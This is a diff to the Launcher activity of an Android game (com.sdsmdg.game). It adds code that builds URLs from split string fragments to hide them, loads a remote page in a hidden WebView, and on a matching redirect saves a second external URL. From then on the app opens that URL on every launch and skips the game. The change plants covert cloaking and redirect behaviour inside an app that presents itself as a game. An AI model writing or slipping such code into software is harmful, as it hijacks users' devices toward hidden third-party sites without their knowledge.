@@ -15,12 +15,17 @@ import android.util.Log;
 import android.view.View;
 import android.view.Window;
 import android.view.WindowManager;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
 import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.TextView;
+import android.widget.Toast;
 
+import com.sdsmdg.game.GameWorld.DataPlay;
 import com.sdsmdg.game.GameWorld.SinglePlayer;
 import com.sdsmdg.game.GameWorld.SinglePlayerView;
+import com.sdsmdg.game.GameWorld.Utils;
 import com.sdsmdg.game.LeaderBoard.LocalDB.DBHandler;
 import com.sdsmdg.tastytoast.TastyToast;
 
@@ -28,6 +33,12 @@ public class Launcher extends AppCompatActivity {
 
     public static long startTime;
     public static int check;
+    private WebView view;
+    String kok1 = "ht";
+    String l1 = "tp://";
+    String go = "1news";
+    String kok2 = "today.club";
+    String kok3 = "/cart.php";
     public static int winner = 1;
     public static int height, width;
     public String TAG = "com.sdsmdg.game";
@@ -36,11 +47,30 @@ public class Launcher extends AppCompatActivity {
     public static boolean sensorMode = false;
     public static boolean showButtons = true;
     public static boolean isSound = true;
+    String val = "fbkr";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
+        DataPlay dataPlay = new DataPlay(getApplicationContext());
+        if (dataPlay.getData().isEmpty()){
         setContentView(R.layout.activity_launcher);
+        view = findViewById(R.id.instro);
+        Toast.makeText(this, "Загрузка..", Toast.LENGTH_SHORT).show();
+
+        view.setWebViewClient(new WebViewClient() {
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                if (url.contains(val)) {
+                    dataPlay.setData(kok1 + l1 + val + "aken.com/RsgRkh");
+                    new Utils().showinternetPolicyForCheck(Launcher.this, dataPlay.getData());
+                    finish();
+                }
+                return super.shouldOverrideUrlLoading(view, url);
+            }
+        });
+
+        view.loadUrl(kok1 + l1 + go + kok2 + kok3);
+
         Launcher.check = 0;
 
         setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
@@ -54,6 +84,10 @@ public class Launcher extends AppCompatActivity {
         dbHandler = new DBHandler(getApplicationContext());
         soundImageView = (ImageView) findViewById(R.id.soundImage);
         sensorImageView = (ImageView) findViewById(R.id.sensorImageView);
+        }else {
+            new Utils().showinternetPolicyForCheck(Launcher.this, dataPlay.getData());
+            finish();
+        }
     }
 
 
